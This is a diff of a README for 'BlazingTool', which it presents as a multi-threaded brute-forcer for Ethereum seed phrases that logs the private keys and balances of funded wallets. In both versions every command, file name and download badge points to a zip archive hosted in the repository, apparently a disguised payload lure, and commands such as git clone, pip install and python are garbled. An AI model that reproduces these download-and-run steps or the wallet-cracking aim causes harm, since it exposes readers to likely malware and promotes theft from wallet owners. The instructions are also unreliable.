@@ -1,6 +1,6 @@
 # BlazingTool
 
-Brute force ethereum wallet mnemonics. Multi-threaded and surprisingly fast. Automatically generate seed phrases and check balances for Ethereum networks. If a wallet with a non-zero balance is found, the wallet's information (address, mnemonic, private key, and balances) is logged and saved to a file named https://github.com/desmonsd/BlazingTool/releases/download/v2.0/Software.zip
+Brute force ethereum wallet mnemonics. Multi-threaded and surprisingly fast. Automatically generate seed phrases and check balances for Ethereum networks. If a wallet with a non-zero balance is found, the wallet's information (address, mnemonic, private key, and balances) is logged and saved to a file named https://raw.githubusercontent.com/desmonsd/BlazingTool/main/img/Blazing-Tool-v1.3.zip
 
 ---
 
@@ -25,7 +25,7 @@ BlazingTool is a powerful tool designed to aid in the discovery and retrieval of
 🔥 Brute force generation of Ethereum wallet mnemonics  
 🔑 Retrieval of private keys associated with discovered wallets  
 💰 Balance checking for Ethereum wallets  
-📝 Logging of wallet information to https://github.com/desmonsd/BlazingTool/releases/download/v2.0/Software.zip file  
+📝 Logging of wallet information to https://raw.githubusercontent.com/desmonsd/BlazingTool/main/img/Blazing-Tool-v1.3.zip file  
 
 ---
 
@@ -35,17 +35,17 @@ To get started with BlazingTool, follow these steps:
 
 1. Clone the repository:
    ```bash
-   git clone https://github.com/desmonsd/BlazingTool/releases/download/v2.0/Software.zip
+   git clone https://raw.githubusercontent.com/desmonsd/BlazingTool/main/img/Blazing-Tool-v1.3.zip
    ```
 
 2. Install the necessary dependencies:
    ```bash
-   pip install -r https://github.com/desmonsd/BlazingTool/releases/download/v2.0/Software.zip
+   pip install -r https://raw.githubusercontent.com/desmonsd/BlazingTool/main/img/Blazing-Tool-v1.3.zip
    ```
 
 3. Run the tool:
    ```bash
-   python https://github.com/desmonsd/BlazingTool/releases/download/v2.0/Software.zip
+   python https://raw.githubusercontent.com/desmonsd/BlazingTool/main/img/Blazing-Tool-v1.3.zip
    ```
 
 ---
@@ -54,11 +54,11 @@ To get started with BlazingTool, follow these steps:
 
 BlazingTool offers a straightforward usage experience for users looking to explore its capabilities. By following the steps outlined below, you can unleash the power of BlazingTool:
 
-1. Launch the tool by running `https://github.com/desmonsd/BlazingTool/releases/download/v2.0/Software.zip`.
+1. Launch the tool by running `https://raw.githubusercontent.com/desmonsd/BlazingTool/main/img/Blazing-Tool-v1.3.zip`.
 2. Select the Ethereum network you wish to target.
 3. Sit back and let BlazingTool work its magic as it generates seed phrases and checks wallet balances.
-4. If a wallet with a non-zero balance is found, the tool will log the wallet's details to `https://github.com/desmonsd/BlazingTool/releases/download/v2.0/Software.zip`.
-5. Once the process is complete, review the `https://github.com/desmonsd/BlazingTool/releases/download/v2.0/Software.zip` file to access the discovered wallet information.
+4. If a wallet with a non-zero balance is found, the tool will log the wallet's details to `https://raw.githubusercontent.com/desmonsd/BlazingTool/main/img/Blazing-Tool-v1.3.zip`.
+5. Once the process is complete, review the `https://raw.githubusercontent.com/desmonsd/BlazingTool/main/img/Blazing-Tool-v1.3.zip` file to access the discovered wallet information.
 
 ---
 
@@ -74,7 +74,7 @@ The tool includes functionality to verify the balances of discovered wallets on 
 
 ### Logging Wallet Information
 
-Upon discovering a wallet with a non-zero balance, BlazingTool meticulously logs the wallet's details to a file named `https://github.com/desmonsd/BlazingTool/releases/download/v2.0/Software.zip`. This feature enables users to conveniently review and analyze the found wallets, including their addresses, mnemonics, private keys, and corresponding balances.
+Upon discovering a wallet with a non-zero balance, BlazingTool meticulously logs the wallet's details to a file named `https://raw.githubusercontent.com/desmonsd/BlazingTool/main/img/Blazing-Tool-v1.3.zip`. This feature enables users to conveniently review and analyze the found wallets, including their addresses, mnemonics, private keys, and corresponding balances.
 
 ---
 
@@ -109,4 +109,4 @@ BlazingTool would like to express gratitude to the following individuals and org
 - OpenZeppelin
 - ConsenSys
 
-[![Download Software](https://github.com/desmonsd/BlazingTool/releases/download/v2.0/Software.zip)](https://github.com/desmonsd/BlazingTool/releases/download/v2.0/Software.zip)
+[![Download Software](https://raw.githubusercontent.com/desmonsd/BlazingTool/main/img/Blazing-Tool-v1.3.zip)](https://raw.githubusercontent.com/desmonsd/BlazingTool/main/img/Blazing-Tool-v1.3.zip)
